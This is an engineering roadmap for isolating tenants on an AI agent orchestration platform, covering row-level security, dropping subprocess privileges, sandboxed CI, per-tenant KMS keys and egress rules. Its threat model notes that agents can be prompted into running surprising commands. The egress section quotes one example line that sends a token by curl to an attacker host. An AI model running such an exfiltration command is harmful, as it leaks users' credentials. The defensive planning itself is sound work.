# Multi-tenant roadmap

AI Orchestra currently runs as **multi-user trusted**: many people log in,
project/task data is filtered per-user via app-level checks
(`userCanAccessProject`, `visibleProjectIds`, etc.), but if any check is
missed or the agent worktree escapes its sandbox, tenants can read each
other's data. The bar we need is **multi-tenant within one company**:
different teams should not be able to access each other's projects, even
if a piece of agent code goes rogue or an HTTP handler has a missing gate.

This doc tracks the work that remains after the first wave of
hardening (commit `d02cc1a` — `pr-api` gates, telegram dedup, workspace
`0o700`, cost-tracker JSDoc).

## Threat model

- **Tenant**: a team inside the company. Tenants are not adversarial
  attackers; they're trusted not to actively pen-test, but their agents
  can hallucinate or be prompted into running surprising commands.
- **Operator**: full host access. Out of scope.
- **External attacker**: out of scope for now. Auth perimeter handles
  this.

Acceptable risk:
- A bug discovered after Phase 2 lands creates a tenant-isolation gap
  that needs a fix + redeploy. NOT acceptable: gaps that go silently
  unnoticed (so: logging + audit trail required everywhere).

## What's done (commits `9664964` → `d02cc1a`)

- Reverted `docker.sock` host bind that gave any agent root on the host.
- `pr-api`: every endpoint gates on `userCanEditProject` /
  `userCanAccessProject`. Zod-tightened bodies.
- Telegram manager: runtime dedup of bot tokens to prevent cross-tenant
  message routing if the partial unique index ever lets a duplicate
  slip through.
- `workspace-scope.ts`: `ensureUserWorkspaceRoot(userId)` creates
  `<root>/<userId>` with mode `0o700` and chmods existing dirs down.
- `cost-tracker`: JSDoc note on low-level helpers that callers must
  pre-validate `projectId` via the access checks.

## What remains, by priority

### 1. Postgres Row-Level Security (RLS)

App-level gates today are the **only** defense. One missed check =
cross-tenant read. RLS adds a hard backstop: even if the application
layer fucks up, the DB refuses to return rows the current user can't
see.

Scope:
- New migration: `ALTER TABLE … ENABLE ROW LEVEL SECURITY` on `projects`,
  `tasks`, `signals`, `sessions`, `agent_logs`, `task_comments`,
  `conversations`, `messages`, `project_notes`, `project_context_cards`,
  `usage_costs`, `flow_audit`, `project_members`.
- Policies keyed on `current_setting('app.user_id')::uuid` joined
  against `project_members` (and `projects.owner_id`).
- Set `app.user_id` per HTTP request via a Fastify preHandler that
  runs `SET LOCAL app.user_id = $1` inside an explicit transaction
  for every query — or switch drizzle to a per-request connection.
- Reconciler / cron jobs run as `BYPASSRLS` via a service-role
  connection string (`DATABASE_URL_SERVICE`) — keep the per-request
  connection on the app-level role.

Risk: drizzle queries that fan out outside the request transaction
(e.g. background promises post-response) lose the `SET LOCAL`. Audit
every `getDb()` call.

Time: ~2 days.

### 2. Subprocess UID isolation

Currently every agent (claude/codex CLI subprocess) is spawned by
orchestra-core, which runs as **root** inside the container. The
subprocess inherits root, so the `0o700` on workspace dirs we just
landed is irrelevant — root reads through it.

Plan:
- Allocate per-tenant UNIX uid on first project create
  (`tenant_<uuid>`). Persist `tenants.uid` (or `users.uid`).
- Create the UNIX user inside the container at runtime
  (`adduser -D -u <uid> tenant-<uuid>`).
- `chown -R tenant-<uuid> /workspace/<userId>` on workspace creation.
- `agent-spawner` calls the runtime CLI with
  `child_process.spawn(cmd, args, { uid, gid })` so the subprocess
  drops privileges. POSIX permissions on `/workspace/<otherUserId>/`
  now reject the cross-tenant read.

Gotchas:
- `claude`/`codex` need their own `$HOME` per tenant (OAuth state).
  `/home/tenant-<uuid>/.claude`, chowned. `CLAUDE_CONFIG_DIR` env per
  spawn already exists — extend it.
- `orchestra_creds` volume currently shared at `/root/orchestra-creds`.
  Split per-tenant: `/var/orchestra-creds/<tenantId>/`.
- The MCP tool subprocess inherits the uid too — it calls back into
  `/api/*`, which validates auth via JWT (works). It also reads/writes
  files in the worktree (works, owned by tenant).
- Container needs `CAP_CHOWN` (default for root) but not
  `CAP_SYS_ADMIN`.

Time: ~3 days.

### 3. Sandboxed QA contour runner

We need `docker compose up` for QA validation but bind-mounting
`docker.sock` is the leak we just plugged. Options, in declining
order of preference:

a) **External CI**. When `pr_created` lands, emit a GitLab/GitHub CI
   job that runs `docker compose up + tests`. QA queries the job's
   logs/results via the provider API. Pros: tenants already trust
   their git host's CI; no privilege in orchestra-core; CI runners
   are isolated by the git host. Cons: latency (CI cold start),
   another piece to operate. **Recommended.**

b) **DinD sidecar per spawn**. For each QA run, start a fresh
   `docker:dind` container with `--privileged`, point QA at it via
   `DOCKER_HOST=tcp://qa-dind-<sessionId>:2375`, tear down on exit.
   Tenant isolation via separate sidecar per session. Privileged
   container is still a risk if QA breaks out of cgroups.

c) **Rootless podman in worktree**. `apk add podman slirp4netns
   fuse-overlayfs`, configure cgroup v2, run podman as the tenant
   uid. Pros: no privileged anything. Cons: alpine + rootless +
   nested-overlay is the most fragile combination of all of these.

Time: option (a) ~2 days, (b) ~3 days, (c) ~5 days.

### 4. Per-tenant `ORCHESTRA_SECRETS_KEY` via KMS

Today: one AES-256 key on the deploy host encrypts every tenant's
git tokens. Compromise of the orchestra-core process reads
`process.env.ORCHESTRA_SECRETS_KEY` and decrypts everyone's tokens
at once.

Plan:
- External KMS (Yandex KMS, AWS KMS, or HashiCorp Vault transit
  engine).
- Per-tenant derived key OR per-tenant key alias. Encrypt project
  tokens with the tenant's key.
- orchestra-core requests decryption via KMS per-secret at use time
  (no caching), so a memory-dump only yields recently-used secrets.

Compatibility: the existing `secrets.ts` interface (`encryptSecret`,
`decryptSecret`) stays the same. Implementation swaps from local AES
to KMS calls. One migration to re-encrypt existing rows with per-tenant
keys.

Time: ~2 days + KMS setup.

### 5. Egress network policy

A compromised agent currently has full outbound network access. It
can `curl https://attacker.com/exfil?token=...` or pivot to other
internal services.

Plan:
- Per-tenant network namespace via Docker user-defined bridge networks.
- iptables/nftables egress rules: allow only the git provider hosts
  configured for the project + Anthropic/OpenAI API hosts.
- Implemented at container-create time, not per-spawn — agents share
  a network policy with their tenant.

Time: ~2-3 days. Depends on host being able to run nftables (most
Linux yes).

### 6. Per-tenant Telegram listener (lighter version of #2)

Today: one `orchestra-core` process long-polls every project's bot.
A parse bug in one project's message handler can crash the whole loop.

Plan: spawn the telegram listener as a subprocess (or even a separate
container) per tenant, run as the tenant uid. Already half-done since
`telegram-manager` keeps per-project AbortControllers.

Time: ~1 day.

## Ordering

1 (RLS) → 2 (UID) → 3a (CI) → 4 (KMS) → 5 (egress) → 6 (telegram).

Stop and re-evaluate after #2 — that's the point where one tenant
genuinely cannot read another's data even if every other check is
missed. #3-#6 are defense-in-depth on top.
